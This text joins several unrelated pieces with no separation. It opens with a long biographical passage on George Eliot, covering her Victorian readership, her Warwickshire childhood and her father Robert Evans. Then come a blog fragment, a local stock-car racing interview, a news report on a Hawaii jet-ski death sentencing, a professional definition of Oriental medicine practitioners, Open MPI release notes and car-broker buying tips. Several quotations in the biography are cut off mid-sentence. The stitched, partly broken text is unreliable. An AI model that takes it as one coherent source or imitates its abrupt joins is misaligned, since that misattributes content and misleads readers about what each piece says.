Because of Eliot's `scandalous' private life, which actually the Queen did not think so very bad, there was no possibility of the two women meeting. Yet recognising their twinship, they stalked each other obliquely down the years. Eliot first mentions Victoria in 1848 when, having briefly caught the revolutionary mood, she speaks slangily in a letter of `our little humbug of a queen'. Ironically, only eleven years later, Victoria had fallen in love with Eliot's first full-length novel, Adam Bede, because of what she saw as its social conservatism, its warm endorsement of the status quo. The villagers of Hayslope, headed by Adam himself, reminded her of her beloved Highland servants, and in 1861 she commissioned paintings of two of the book's central scenes by the artist Edward Henry Corbould.
George Eliot noticed how hard the Queen took the loss of Prince Albert in 1861 and, aware of the similarities in their age and temperament, wondered how she would manage the dreadful moment when it came to her. The Queen, in turn, was touched by the delicate letter of condolence that Eliot and Lewes wrote to one of her courtier's children on his death and asked whether she might tear off their double signature as a memento.
The Queen's daughters went even further. By the 1870s Eliot's increasing celebrity and the evident stability of her relationship with Lewes meant that she was no longer a total social exile. Among the great and the good who pressed for an introduction were two of the royal princesses. Brisk and bright, Vicky and Louise lobbied behind the scenes for a meeting and then, in Louise's case at least, dispensed with royal protocol by coming up to speak to George Eliot first.
The princesses were among the thousands of ordinary Victorians, neither especially clever nor brave, who ignored the early grim warnings of clergymen and critics about the `immorality' of George Eliot's life and work. By the 1860s working-class men and middle-class mothers, New Englanders (that most puritan of constituencies) and Jews, Italians and Australians were all reading her. Cheap editions and foreign translations carried George Eliot into every kind of home. Even lending libraries, those most skittishly respectable of `family' institutions, bowed to consumer demand and grudgingly increased their stock of Adam Bede and The Mill on the Floss.
What is more, all these Victorians read the damnable George Eliot with an intensity and engagement that was never the case with Dickens or Trollope. While readers of Bleak House might sniff over the death of Jo and even stir themselves to wonder whether something might not be done for crossing-sweepers in general, they did not bombard Dickens with letters asking how they should live. That intimate engagement was reserved for Eliot, who alone seemed to understand the pain and difficulty of being alive in the nineteenth century. From around the world, men and women wrote to her begging for advice about the most personal matters, from marriage through God to their own poetry. Or else, like Princess Louise, they stalked her at concert halls, hoping for a word or a glance.
The worries which Eliot's troubled readers laid before her concerned the dislocations of a social and moral world that was changing at the speed of light. Here were the doubts and disorientations that had been displaced from that triumphant version of Victorianism. An exploding urban population, for instance, might well suggest bustling productivity, but it could also mean a growing sense of social anomie. Rural communities were indeed invigorated by their new proximity to big towns, but they were also losing their fittest sons and daughters to factories and, later, to offices and shops. Meanwhile the suburbs, conceived as a rus in urbe, pleased no one, least of all George Eliot, who spent five years hating Richmond and Wandsworth for their odd mix of nosy neighbours and lack of real green.
For if in one way Victorians felt more separate from each other, in others they were being offered opportunities to come together as never before. It was not just the railway that was changing the psycho-geography of the country, bringing friends, enemies and business partners into constant contact. The postal service, democratised in 1840 by the introduction of the Penny Post, allowed letters to fly from one end of the country to the other at a pace that makes our own mail service look like a slowcoach. Then there was the telephone which, at the end of her life, George Eliot was invited to try. As a result of these changes Victorians found themselves pulled in two directions. Scattering from their original communities, they spent the rest of their lives trying to reconstitute these earlier networks in imaginary forms.
Science, too, was taking away the old certainties and replacing them with new and sometimes painful ones. It would not be until 1859 that Darwin would publish Origin of Species, but plenty of other geologists and biologists were already embracing the possibility that the world was older than Genesis suggested, in which case the Bible was perhaps not the Last Word on God's Word. Perhaps, indeed, it was not God's Word at all, but rather the product of man's need to believe in something other than himself. This certainly was the double conclusion that Eliot came to during the early anonymous years of her career when she translated those seminal German texts, Strauss's The Life of Jesus (1835-6) and Feuerbach's The Essence of Christianity (1841). Her readers likewise wrestled with the awful possibility that there was no moral authority except the one which was to be found by digging deep within themselves. Not only did a godless universe lay terrifying burdens of responsibility upon the individual, but it unsettled the idea of an afterlife. To a culture which had always believed that, no matter how dismal earthly life might be, there was a reward waiting in heaven, this was a horrifying blow beside which the possibility that one was an ape paled into insignificance.
That much-vaunted prosperity turned out to be a tricky business too. For every Victorian who felt rich, there were two who felt very poor indeed, especially during the volatile 1840s and again in the late 1860s. During Eliot's early years in the Midlands she saw the effect of trade slumps on the lives of working families. As a schoolgirl in Nuneaton she had watched while idle weavers queued for free soup; at home, during the holidays, she sorted out second-hand clothing for unemployed miners' families. Even her own sister, married promisingly to a gentlemanly doctor, found herself as a widow fighting to stay out of the workhouse.
To middle-class Victorians these sights and stories added to a growing sense that they were not, after all, in control of the economic and social revolution being carried out in their name. Getting the vote in 1832 had initially seemed to give them the power to reshape the world in their own image: the repeal of the Corn Laws in 1846 had represented a real triumph of urban needs over the agricultural interest. But it soon became clear that early fears that 1832 would be the first step towards a raggle-taggle democracy were justified. On three occasions during the `hungry forties' working-class men and women rallied themselves around the Charter, a frightening document demanding universal suffrage and annual parliaments. By the mid-1860s, with the economy newly unsettled, urban working men were once again agitating violently for the vote.
These were worrying times. The fat little figure of the Queen was not enough to soothe Victorians' fears that the blustery world in which they lived might not one day blow apart completely. In fear and hope they turned to the woman whose name they were initially only supposed to whisper and whose image they were seldom allowed to see. George Eliot's novels offered Victorians the chance to understand their edginess in its wider intellectual setting and to rehearse responses by identifying with characters who looked and sounded like themselves. Thanks to her immense erudition in everything from theology to biology, anthropology to psychology, Eliot was able to give current doubts their proper historic context. Dorothea's ardent desire to do great deeds, for instance, is set alongside St Teresa's matching passion in the sixteenth century and their contrasting destinies explained. In the same way Tom Tulliver's battles with his sister Maggie are understood not just in terms of their individual personalities, but as the meeting point of several arcs of genetic, cultural, and family conditioning at a particular moment in human history.
While disenchantment with Victorianism led readers to George Eliot, George Eliot's advice to them was that they should remain Victorians. Despite the ruptures of the speedy present, Eliot believed that it was possible, indeed essential, that her readers stay within the parameters of the `working-day world' — a phrase that would stand at the heart of her philosophy. She would not champion an oppositional culture, in which people put themselves outside the ordinary social and human networks which both nurtured and frustrated them. From Darwin she took not just the radical implications (we are all monkeys, there is probably no God), but the conservative ones too. Societies evolve over thousands of years; change — if it is to work — must come gradually and from within. Opting out into political, religious or feminist Utopias will not do. Eliot's novels show people how they can deal with the pain of being a Victorian by remaining one. Hence all those low-key endings which have embarrassed feminists and radicals for over a century. Dorothea's ardent nature is pressed into small and localised service as an MP's wife, Romola's phenomenal erudition is set aside for her duties as a sick-nurse, Dinah gives up her lay preaching to become a mother.
Eliot's insistence on making her characters stay inside the community, acknowledge the status quo, give up fantasies about the ballot, behave as if there is a God (even if there isn't) bewildered her peers. Feminist and radical friends assumed that a woman who lived with a married man, who had broken with her family over religion, who was one of the highest-earning women in Britain, must surely be encouraging others to do the same. And when they found that she did not want the vote for women, that she felt remote from Girton and that she sometimes even went to church, they felt baffled and betrayed.
What Eliot's critics missed was that she was no reactionary, desperately trying to hold back the moment when High Victorianism would crumble. Right from her earliest fictions, from the days of Adam Bede in 1859, she had understood her culture's fragility, as well as its enduring strengths. None the less, she believed in the Victorian project, that it was possible for mankind to move forward towards a place or time that was in some way better. This would only happen by a slow process of development during which men and women embraced their doubts, accepted that there would be loss as well as gain, and took their enlarged vision and diminished expectations back into the everyday struggle. In Daniel Deronda, Eliot's penultimate book and last proper novel, she shows how this new Victorianism, projected on to a Palestinian Jewish homeland, might look and sound. Although it will cohere around a particular social, geographic and religious culture, it will acknowledge other centres and identities. It will know and honour its own past, while anticipating a future which is radically different. By being sure of its own voice, it will be able to listen attentively to those of others.
It was Eliot's adult reading of Wordsworth and Scott that instilled in her the conviction that `A human life, I think, should be well rooted in some spot of a native land ... a spot where the definiteness of early memories may be inwrought with affection'. But it was during her earliest years, as she accompanied her father around the Arbury estate in his pony trap, that she fell deeply in love with the Midlands countryside. Her `spot' was Warwickshire, the midmost county of England. Uniquely, the landscape was neither agricultural nor industrial, but a patchwork of both. In a stunning Introduction to Felix Holt, The Radical, George Eliot used the device of a stagecoach thundering across the Midlands on the eve of the 1832 Reform Act to describe a countryside where the old and new sit companionably side by side.; after the coach had rattled over the pavement of a manufacturing town, the scene of riots and trades-union meetings, it would take him in another ten minutes into a rural region, where the neighbourhood of the town was only felt in the advantages of a near market for corn, cheese, and hay.
Mary Anne's early life, contained within the four walls of Griff farmhouse, where her family moved early in 1820, still belonged securely to the agricultural `phase of English life' and was pegged to the daily and seasonal demands of a mixed dairy and arable farm. Although there were male labourers to do the heavy work and female servants to help in the house, much of the responsibility was shouldered by the Evans family itself. Like many of the farmers' wives who appear in Eliot's books, Mrs Evans took particular pride in her dairy, running it as carefully as Mrs Poyser in Adam Bede, who continually frets about low milk yields and late churnings. Like the wealthy but practical Nancy Lammeter in Silas Marner, too, Mrs Evans and her two daughters had bulky, well-developed hands which `bore the traces of butter-making, cheese-crushing, and even still coarser work'. Some years after George Eliot's death, a rumour circulated in literary London that one of her hands was bigger than the other, thanks to years of turning the churn. It was a story which her brother Isaac, now gentrified by a fancy education, good marriage and several decades of high agricultural prices, hated to hear repeated.
The rhythms of agricultural life made themselves felt right through Mary Anne's young adulthood. As a prickly, bookish seventeen-year-old left to run the farmhouse after her mother's death, she railed against the fuss and bother of harvest supper and the hiring of new servants each Michaelmas. And yet the very depth of her adolescent alienation from this repetitive, witless way of life reveals how deeply it remained embedded in her. Thirty years on and established in a villa in London's Regent's Park, her first thought about the weather was always how it would affect the crops.
But life on the Arbury estate was no bucolic idyll. The Newdigate lands contained some of the richest coal deposits in the county. As she grew older, the fields in which Mary Anne played had names like Engine Close and Coal-pit Field. Lumps of coal lay casually amid the grass. At night the girl was kept awake by the chug-chug of the Newcomen engine pumping water out of the mine less than a mile from her home. The canal in which she and Isaac fished was busy with barges taking the coal to Coventry. And when Mary Anne accompanied her father on his regular visits to Mr Newdigate at Arbury Hall, she would have noticed the huge crack which cut across the gold-and-white ceiling of the magnificent great hall. Subsidence caused by the mine-working had dramatically marked a building whose elaborate refashioning only a generation before had come to stand for everything that was elegantly Arcadian about aristocratic life.
Nor did Mary Anne have to look very far to fit the uneven textures of the Arbury estate into the wider landscape. Most of the people in the scrappy hamlet of Griff were not farm labourers but miners. In the nearby villages people were mainly employed in cottage industries like nail making, ribbon weaving and framework knitting. The pale faces and twisted bodies of the handloom weavers struck Mary Anne as absolutely different from the Arbury farmers, a contrast she was to use later in suggesting the weaver Silas Marner's alienation from his ruddy Raveloe neighbours.
Only a few miles along the road was Nuneaton, the market town where Mary Anne was soon to go to school. In her very first piece of fiction she describes the town — renamed Milby — as a place where intensive homeworking had already left its grimy.'
As Eliot's description of hard labour and pinched surroundings suggests, these were not prosperous times for the Midlands. Victory over Napoleon in 1815 had meant an end to protection against imports of French and Swiss ribbon. A couple of months before Mary Anne's birth, a cut in the rate paid to silk weavers brought an angry crowd out on to the street. There was jeering and jostling, and a man accused of working under-price was tied backwards on a donkey and led through the streets. Later, as a schoolgirl in Nuneaton, she was to see hunger-fuelled rioting at first hand.
As Mary Anne followed her father from miner's cottage to farmhouse to Arbury Hall itself, she learned to place herself within this complex social landscape. She noted that while tenant farmers might nod respectfully at her, when she got to Arbury Hall, she was left in the housekeeper's room while her father went to speak to the great man. She observed a whole range of accents, dress, customs and manners against which her own must be measured and adjusted. In this way she built up a library of visual and aural references to which she could return in her imagination when she was sitting, years later, in Richmond trying to recapture the way a gardener or a clergyman spoke. It was this faithfulness to the actual past, rather than a greetings-card version of it, which was to become a plank in her demand for a new kind of realism in fiction. In Adam Bede she breaks off in the middle of describing the young squire's coming-of-age party to ask her sentimental, suburban reader:  the birds.' Mary Anne Evans had not only seen labourers dancing, she had watched them getting drunk, making love, milking and shearing. She had been patronised by the gentry and petted by their servants. And while these pictures were neither charming nor quaint, they sustained her sense of being rooted in a community which was to carry her through the long years of urban exile. She knew every field, every hedgerow and every clump of trees. In later life, she had only to close her eyes and she could conjure up the smell of cows' breath, hay and fresh rain. But she also knew the way the muddy canal absorbed the sunlight and the noise the looms made as the weavers worked into the night. Looking at the world through her father's expert eyes, she learned to see that these two strands of life were not conflicting, but that they represented a particular moment in the development of English life. The rural community had not been destroyed, but it was being radically regeared towards technology, profit and the power of the individual to manage his own life. And no one had benefited more from these changes than Robert Evans.
Evans had been born in Roston Common, Derbyshire, in 1773, one of eight children. There were the usual family romances about gentry stock, but by the time Robert arrived any grand connections were nothing more than stories. His father, George, was a carpenter and his mother was called Mary Leech. The five Evans boys were determined to ride the wave of social and economic expansion unleashed by the first phase of industrialisation. Second son William rose to be a wealthy builder, while Thomas overcame a shaky start to become county surveyor for Dorset. Even dreamy Samuel, who turned Methodist and kept his eye on the future world, ran a ribbon factory. Only the eldest boy, George, was unsteady. He boycotted the family's carpentry business and there was talk of heavy drinking. When he died, the Evans clan turned its collective and implacable back on his young children.
Mary Anne was to experience both sides of this Evans legacy. Like her father and his brothers, she rose out of the class into which she was born by dint of hard work and talent. She left behind the farm, the dairy and the brown canal, and fashioned herself into one of the leading intellectual and literary artists of the day. But just like her uncle George — was it coincidence that she took his name as the first half of her writing pseudonym? — she learned what it was like to belong to a family which regularly excluded those of whom it did not approve. When, at the age of twenty-two, she announced that she did not believe in God, her father sent her away from home. Fifteen years later, when she was living with a man to whom she was not married, her brother Isaac instructed her sisters never to speak or write to her again. The Evanses, like thousands of other ambitious families at that time, demanded that its members forge their individual destinies while skirting nonconformity.
In the case of the Evans boys, those destinies were forged in the workshop rather than the classroom. When they did attend school — run by Battle Massey, a name which would crop up in Adam Bede — it was to learn accounting, `mechanics' and `to write a plain hand'. Robert's hand did indeed remain plain all his adult life, but despite almost daily entries in his journal and a constant correspondence with his employers, he was never to become comfortable with the pen. Reading his papers remains a tricky business, thanks to patchy punctuation, haphazard spelling and a whimsical use of capitals and italics. `Balance' becomes `ballance', `laughed' is `laph'd', while `their' and `there' are constantly confused. Despite a career of forty years spent note-taking and report-making, Robert Evans remained uneasy with the written word, finding, like Mr Tulliver in The Mill on the Floss, `the relation between spoken and written language, briefly known as spelling, one of the most puzzling things in this puzzling world'.
Evans preferred to dwell in the stable and particular. As a young carpenter he had learned how to turn the elms and ash of Derbyshire and Staffordshire into windows, tables and doors. And as he walked through the forest on his way to the farmhouses where he was employed, he looked around at the trees that ended up on his work-bench. He took note of the conditions under which the best wood flourished. He saw when a stand was ready to be cut and when it should be left for a few weeks more. Later in his career it was said that he had only to look at a tree to know exactly how much timber it would yield.
To any landed proprietor, intent not simply on gazing at his parkland but increasing its profit, a man like Evans could be useful. It was now that he came to the attention of Francis Parker, a shrewd young gentleman of about the same age, who spotted the carpenter's potential to be more than a maker of cottage doors and fancy cabinets. Parker persuaded his father — another Francis Parker — to put Evans to work managing Kirk Hallam, their Derbyshire estate. So began Evans's career as a self-made man. Reworked in fiction as the ruptured rivalrous bond between Adam Bede and Arthur Donnithorne, the real-life Parker and Evans remained cordial, but always mindful of their vastly different stations. Over the next forty years they offered each other — often by letter, since Parker lived much of the time in Blackheath, Kent — cautious encouragement and condolence as the trials of their parallel lives unfolded.
In 1806, by a cat's cradle of a will, Francis Parker senior inherited a life interest in the magnificent Warwickshire estate of Arbury Hall from his cousin Sir Roger Newdigate. Parker, now renamed Newdigate, moved to Arbury and brought Evans with him as his agent. Evans, by now thirty-three and a father of two, was installed at South Farm, from where he could manage the 7000-acre estate while running his own farm.

Overview...Dear World- This blog post is now part of my new book so I took it down because I don't want to be a jerk and ruin it for you-
you-
This book is not a memoir..
Every day, Sunny, every stinkin' day. Difference is You Are Hot even in your curlers. I'm just trying to be invisible so I don't have to try to be in the 'above average for her age' group. I hpe you made the Hell out of that birthday cake.
hey- your story made me laugh_thank you.:) xoThis.
Wade: Derek, everyone gets excited about the Best of the Best Pro Stock 150. Who-ever goes to the Riverview Ford Lincoln Victory Lane has good reason to celebrate.
Derek: They certainly do Wade. If you don’t participate in the two touring series events, it’s the first extended lap pro stock event of the season. It’s a great way to prepare for the Auto Value 250 with our rules package and tires, never mind the guaranteed provisional for that event. We usually get a few guys from out of town that are pretty good benchmarks as well.
Wade: You guys normally run 40 laps features. Those extra 110 laps have got to be hard on both the car and driver.
Derek: If your car’s not handling well, or if you run into trouble, it can definitely be a long race. But I learned a lot in the Martins Home Heating Sportsman division on how to prepare mentally for the longer events and how to race in the early part of the race in order to make it to the finish. You can afford to be patient and give guys a lot more room early in these races. As for the cars, you want to have fresh fluids and grease in them and give your braking system a close look the week before. It’s almost four features wrapped up into one, but these cars can handle the extra laps, the weakest part is definitely the driver.
Wade: Your Dad Leon was a pretty good Pro Stock racer. He had a podium finish in the Auto Value 250 one year and always was a solid performer in the RE/MAX Group Four Realty Pro Stock Division. How much influence has he had on your racing career?
Derek: My Dad has been a huge influence and I owe everything I have in racing to him. If it wasn’t for Dad, I’d probably be racing a Chevy! Seriously, without his support, I wouldn’t be racing at all. But you’re right he was a solid performer and excelled at the long races. He did a good job taking care of his equipment and always seemed to be near the front at the end of the night. Driving a race car has been a big thrill, but Dad’s podium finish in the Auto Value 250 was by far the most fun I’ve ever had at Speedway 660. I think for the first seven or eight years Dad had one of the best average finishes in the 250. Each year he was always in contention for the most laps run award during the regular season. It was a great example of how being patient and keeping your distance from some of the chaos early on can really pay off in the end. I can probably do a better job at that, but it’s definitely something I try to emulate – make it to the checkers.
Derek and his Dad Leon enjoy a moment in the Speedway 660 pits before a recent race. Leon, Derek and Richard MacIntosh are one of our smallest pro stock crews, but their car is always well prepared and ready to race when it’s time to “go green”.
Wade: Drivers take different paths to get where they want to go. You really paid your dues by running a few years in the DMR Auto Sales & Service Street Stock Division and then in the Martins Home Heating Sportsman before moving up to pro stock. Why did you take that route and how did the experience in other divisions help when you got into the pro stock ride?
Derek: If the Fredericton Gun Shop Sharp Shooters had of existed when I started racing, I probably would’ve had an Escort GT in that division before ever getting into a street stock. I’m not on any type of time-table, so there was never any rush to move up to pro stock. For me, it was an affordable way to learn the ropes. And how could you pass up an opportunity to race against Joe Albert & Rick Cashol? I actually got spun out by “Smokin Joe” in my first race. Is there any better welcome to street stock a guy could get? The racing is just as good and as fierce in street stock and sportsman as it is in pro stock. Sometimes it’s even probably a bit better, so as far as learning and having fun, it’s a good path to take. Crashing a Crown Victoria is a lot cheaper than crashing Hamke or Port City, believe me, I’ve done both.
Wade: We are seeing a lot of kids get into racing. From go-karts, to bandoleros to sharp shooters there is a real youth movement at Speedway 660. Some of these kids are moving up through the divisions quickly. Some are even jumping from bandos right into pro stocks. What advice do you have for these young racers?
Derek: I think the biggest thing is to not try too hard when you’re behind the wheel. You’re going to start last or near the back for the first five weeks, so it’s important to try to get a feel for how the other guys and gals are driving around you. It’s important to simply get comfortable racing. You can turn a million laps by yourself on the track, but nothing is going to prepare you for the drop of the green flag. I think I only finished two out of my first four or five races in both street stock and sportsman. It wasn’t until I settled down and decided to finish a few races that I was able to get more comfortable in the car and race better. Plus Dad was a lot happier not having to rebuild the front end of the car each week, even though that still happens from time to time.
Wade: The Auto Value 250 is the biggest race in the Maritimes. It attracts a lot of the Parts for Trucks pro stockers as well as the best Pro All Star Series late modified drivers. That’s tough competition.
Derek: Plus over the years we’ve also had the odd NASCAR celebrity driver, so racing against competition like that is the best part about racing a pro stock. The championship is an accomplishment, but winning the 250 is really the crown jewel of our season in my opinion. Just look at the SpeedWeekend crowds, that says it all.
Wade: We know your Dad Leon plays a big role in your racing program. Who else helps you out in the garage and pits and who are those important corporate sponsors who make it possible for you to go racing?
Derek: Dad does all the work in the garage on his own, but Richard MacIntosh has been a good friend and part of the crew for over 10 years. I don’t think he’s ever missed a week, even had his wedding in the spring and baby in winter, a true racer. Our crew isn’t very big, just three of us, but we work really well together. We’re really fortunate to have had all of our sponsors for several years, some of them for more than a decade. Northside Ventilation has been our primary sponsor for the last three years, A.L. Gullison Disaster Kleenup is well known to race fans and have been our sponsor for almost 15 years, Everett Gilmore & Riverview Ford Lincoln are also great sponsors and friends of racing as well. York Financial Services, NAPA in Nackawic and DWG are a big help to us. This year we have a new sponsor Northside Indoor Pistol Range, they’re a new indoor shooting range off the Killarney Road in Fredericton for anyone who is a hand gun enthusiast and wants to improve their skills. I’d also like to give a big shout out to Re/MAX for coming on board this season and sponsoring the pro stock division. It’s nice to see new sponsors in the sport and it really helps attract other corporate sponsors when you have a company with the corporate image and name recognition that Re/MAX brings to Speedway 660.
Derek Christie (#9) makes the outside pass on two-time RE/MAX Pro Stock champ Chris Duncan at a race earlier this season. Derek is looking forward to the Best of the Best Pro Stock 150 this weekend. It will give drivers an opportunity to earn a guaranteed starting position in the Auto Value 250 on SpeeWeekend.
Wade: Speedway 660 has the best fan support in the Maritimes. We get great crowds and they are knowledgeable about this sport. How do you feel about our fans and what’s it like to race in front of them every week?
Derek: You said it Wade, our fans are the best, especially the ones wearing the Ford Racing or Riverview Ford hats! I really enjoy Kids Day and Fan Appreciation Day because it gives us the opportunity to take a few extra minutes with the fans. It’s always amazing to learn how far away some of our fans travel to watch a regular event at Speedway 660. It’s also a good reminder to not take for granted the great facility we have here. I know growing up in Temperance Vale during the 80s we had to travel to Caribou or Riverglade or Miramichi to watch racing before Speedway 660 was built. I might be mistaken, but I think Shawn Tucker used to travel all the way to Bangor to race every week. So again, we’re really lucky to have fans that support the track, because without the fans obviously the track wouldn’t exist.
Wade: You are a consistent driver and from where I sit you seem to take a steady, even-keeled approach to racing. How difficult is it to stay calm and focused out there and be competitive with guys like Shawn Tucker, Ben Rowe and Johnny Clark?
Derek: Thanks Wade, some situations are more difficult than others to stay calm out there, but when you’re racing against the guys you mentioned and guys like Cassius Clark, Lonnie Sommerville, Travis Benjamin, John Flemming, Craig Slaunwhite and the other touring series drivers it’s actually pretty easy to stay calm. Those guys take driving a race car to another level and have so much experience and car control that they rarely make any mistakes or do anything stupid out there. I remember the first time I raced against Ben Rowe and Shawn Tucker at the Atlantic Cat 250 in 2011. They lapped me around lap 40 or 50, when I was in the back half of the field racing with some other hooligans. I couldn’t believe how smooth they were, they looked like they had one hand on the wheel and another holding a copy Circle Track magazine. Whenever I’m around any of those guys on the track, even in practice, I just try to learn as much as I can and give them the respect they deserve. I’d rather show them I can control my car, than try to show them how fast I can go. Dave O’Blenis is the same way, you can run an inch off his door panel and have no fear of touching, but with some other guys you have to give a few extra feet. We’re lucky to have that caliber of driver here every week. The sportsman guys groan a bit when Dave shows up to their big events, but hopefully they take the opportunity to learn from him. He has a good car, but he’s also a great driver.
Wade: Thanks for doing this Derek. Good luck on the weekend. I’m sure we are going to see a great race.
Derek: I enjoy reading these conversations every week and appreciate you asking me to participate in one of them. I’m really looking forward to the race.Tears flowed in the courtroom on Wednesday for the 16-year-old teenager from Vacaville who died in a watercraft collision in July, for the young man blamed for the deadly crash, and for the families left to pick up the pieces.
"I am deeply sorry for what's I've done," said Tyson Dagley, a 20-year-old Australian man who was visiting Hawaii last month.
During his sentencing, Dagley again expressed remorse for what happened at Keehi Lagoon one month ago to the day.
Video was released by Dagley's attorney that showed exactly what happened. Prosecutor say Dagley was looking to the side posing for his girlfriend when his WaveRunner slammed into Kristen Fonseca. The California teenager died a day later.
"I go in her bed and smell her pillows and pretend it's her," said Fonseca's mother Evangelina Canton.
In court, Canton's hands trembled as she expressed her grief, pulling out a short poem Kristen wrote as a young girl.
"I dream I had a cell phone. I scream when I'm afraid. I'm an 8-year-old girl. I want a motor scooter. I wonder if I will ever have kids," said Canton.
Dagley was charged with third-degree negligent homicide. He spent 12 days in prison before being freed on $100,000 bail. Dagley pleaded no contest to the charge.
Judge Richard Perkins accepted the plea on Wednesday, gave him credit for time served, and agreed to clear Dagley's record if he stays out of trouble for a year.
It's a sentence Kristen's family compared to a traffic ticket.
"Mr. Dagley just gets to go home, go back to his life and resume his life just like nothing occurred -- just to move on," said Mario Canton, Fonseca's stepfather. "It's a travesty to us and I couldn't be more upset about this decision."
Dagley is free to return to Australia, but he must perform 48 hours of community service and pay Fonseca's family more than $78,000 in restitution.
Payments can be made in increments of $30 a month -- a payment Dagley's attorney promises will be fulfilled.
"They take pride. They keep their word. They're just good 'salt of the earth' people," said attorney Walter Rodby.
After the sentencing, a second plea from Fonseca's mother. She hopes her daughter's death inspires Hawaii lawmakers to pass stricter rules for watercraft operations.
"So they don't feel the pain that I'm feeling. So that they don't wake up every morning looking for your daughter, and she's not there. So they don't go into the room and hug a pillow that's not their daughter, but smell it and pretend it's her," said Evangelina Canton.
It's but another sign this pain will live long and deep for both families. Dagley repeatedly broke down crying in court. The weight of a life lost forever on his shoulders.
"I pray for Kristen and her family every morning and night and no words can explain how I feel," said Dagley.
The Fonsecas are now suing Aloha Jet Ski Rentals along with Dagley for an undisclosed amount of money.
Dagley's girlfriend, Natasha Ryan, is charged with hindering prosecution after she tried to delete video she shot of the watercraft accident. She's set to enter a plea Friday.Who Are Independent AOM Providers?
IAOMPs are professionally educated practitioners trained in a variety of fashions before 1980. Programs for the education of IAOMPs joined to form the CCAOM in 1982 and since 1987 have offered master’s degree level education accredited by ACAOM.
IAOMPs are dedicated to providing comprehensive and high quality services to both patients and clients.
Patients are recipients of AOM examination, evaluation diagnosis, prognosis and intervention and who have a disease, disorder, condition, dysfunction or distress. While patients may have received a conventional or other complementary and alternative medical diagnosis for the clinical circumstance that brings them for AOM care, and while the conventional medical diagnosis shall be considered to be the primary care diagnosis, IAOMPs proceed based on an AOM diagnosis and assessment that drives the AOM plan of care.
Clients engage the services of IAOMPs where they perceive possible benefits to be gained from AOM consultation, education, intervention, professional advice or services aimed at illness prevention or promotion of wellness, health and well-being.Library Interfaces and Headers

Various checkpoint and restart issues were fixed, including checking for malformed metadata files, fixing error paths in ompi-checkpoint, and fixing C/R-enabled plugin shutdown logic. VampirTrace node name detection on Cray XT and some broken VT docs were fixed. A race condition in RDMA CM-based connections was fixed. Error checking on MPI_GRAPH_CREATE was relaxed. A shared memory "hang" problem that occurred on x86/x86_64 platforms when used with the GNU >=4.4.x compiler series was fixed. A fix was added for Libtool 2.2.6b's problems with the PGI 10.x compiler suite.
Release Notes: This release closes a potential security vulnerability (considered low / trivial risk) associated with the embedded version of GNU Libtool used in the Open MPI v1.3.x series. The only change between Open MPI v1.3.4 and Open MPI v1.4 is that GNU Libtool 2.2.6b was used to build Open MPI v1.4, thereby updating Open MPI's embedded copy of the "libltdl" library.
Release Notes: This release fixes mpi-selector's use of shell_scripts_basename in the specfile. It adds many mpirun process affinity options. It fixes SLURM nodelist parsing logic. It reverts to a safer CID allocation scheme. It fixes OpenFabrics minimum distance calculations. It fixes MPI_COMM_SPAWN to only error-check the info arg at the root. It fixes BLCR and CRS self issues, fixes a deadlock with openib and MPI_THREAD_MULTIPLE, and fixes dynamic rules selection for the tuned coll. It adds Chelsio T3 RNIC device IDs. It adds PSM MTL MCA parameters. It fixes VT issues with constants. It adds Alpha and SPARC platform support. It properly hides embedded libltdl symbols.
Release Notes: Bugs in OpenFabrics support were fixed. The system now ensures that mpirun returns a non-zero status when applications die due to user signals, and uses fork to launch on localhost. ob1 PML is now more robust. Signal handlers are not installed during MPI_INIT if already installed. GM, Platform LSF, VampirTrace, PLPA, SLURM, and SGE fixes were made. Relaxed PCI ordering support was added for uDAPL on Solaris. Shared memory scalability was improved. Fixed application ABI support was provided for 1.3 and 1.4. POSIX processor count detection and configure --with-libnuma handling were fixed.
Release Notes: Various fixes were made for checkpoint/restart and binary pre-loading functionality. mpirun is now guaranteed to exit with a nonzero status if an error occurs. MPI_FILE_C2F was fixed to return 0 instead of -1. Various patches were incorporated from Debian Open MPI package maintainers. MPI::SEEK_* constant handling was improved. mpirun's -wdir switch was fixed with multiple app contexts. A limited ability to SIGTSTP and SIGCONT MPI jobs was added. Fixes were made for Intel (NetEffect) RNIC behavior. Some corner cases when sizeof(int) != sizeof(Fortran INTEGER) were fixed. Some race conditions with SLURM were fixed, and the plugin build of the PBS/Torque support was fixed. Several problems with stdin/stdout/stderr forwarding were fixed. A hang/deadlock in some IB "GET" message passing patterns was fixed. A case where datatypes with prefix gaps were considered contiguous was corrected. Various compile errors with VampirTrace and some esoteric platforms were fixed. The default values of IB and RNR timeouts were increased. An option to synchronize every N collective operations was added.
Release Notes: MPI-2.1 is now supported. Support was added for new architectures, OS versions, and batch schedulers. Thread safety support has been improved. The C++ bindings have been improved. Valgrind memory-checking support was integrated. ROMIO was updated to the version shipped in MPICH2 v1.0.7. The scalability of parallel launch was significantly improved. Point-to-point latency was reduced. Support for iWARP devices was added. Numerous other enhancements were made for OpenFabrics-based networks, such as much better utilization of registered memory. Support for checkpoint/restart fault tolerance was added.
Release Notes: The Fortran 90 binding for MPI_CART_GET was fixed. Spurious ROMIO/IO warnings were removed. A bug was fixed to ensure command line MCA parameters always override environment-set MCA parameters. A bug in AMD64 assembly was fixed. Intercommunicator gather/scatter was fixed. More man page fixes were made. An openib BTL check is done to see if devices are present before activating itself. More vendor IDs were added for InfiniBand HCAs.
Release Notes: Intercomm allgather was fixed. A bug with setting completion queue depth in the openib BTL was fixed. More vendor IDs were added for InfiniBand HCAs. Support was added for shared contexts in the PSM MTL. pml_ob1_use_early_completion was added to fix "hung" OpenFabrics applications. Some Autoconf macros were sanitized in mpi.h. More man page fixes were made. The Fortran 90 interface for MPI_CART_CREATE was fixed. Some C++ compiler warnings were fixed.Robbery suspect CCTV released

A simple flip through the phone or a quick Internet search will yield you dozens of services, if not more. So how do you know which ones are best? Here are a few tips to help you find the best services.
True Brokers
Make sure you are finding a broker that is a broker first. Call around to local dealerships and see if they’ve heard of the broker or car buying service. It’s very easy for people to pretend to be brokers to earn your money. You also want to make sure the broker isn’t getting kickbacks from or working exclusively for a dealership. These brokers don’t have your best interest at heart.
Check Licensing
Check with your state to ensure the broker is licensed to legally sell cars. Most states have laws regarding licensing for brokers and new car buying services. While you are doing this, check with the Better Business Bureau, Edmunds and Town Hall forums for feedback on the car buying service.
Ask Friends and Other References
Finding the top rated broker services in your area can be as easy as asking others you know who may have used a service. There are plenty of people who are willing to share their success or horror stories with you. If you don’t know anyone who has used a car buying service, you can check different online forums for feedback.
Finding a top rated car buying service isn’t difficult if you spend a little time researching and know what you’re getting in to.Re: This should be easy

